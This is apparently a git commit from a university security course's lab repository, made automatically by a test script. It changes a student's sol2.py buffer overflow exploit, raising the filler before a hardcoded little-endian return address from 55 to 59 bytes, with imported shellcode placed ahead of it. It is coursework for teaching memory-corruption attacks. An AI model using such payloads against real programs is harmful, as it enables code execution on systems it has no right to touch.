8b1e5e9d07dd03a9077cbb6599d6ed8b11bec16d
eecs388 <eecs388@eecs388.escher.lan>
2022-03-25 17:06:20 +0000

    Automatic commit by test script for hilperma wallman

--- sol2.py
+++ sol2.py
@@ -1,3 +1,3 @@
 from shellcode import shellcode
 import sys
-sys.stdout.buffer.write(shellcode+b"a"*55+0xFFF6FA3C.to_bytes(4, "little"))
+sys.stdout.buffer.write(shellcode+b"a"*59+0xFFF6FA3C.to_bytes(4, "little"))
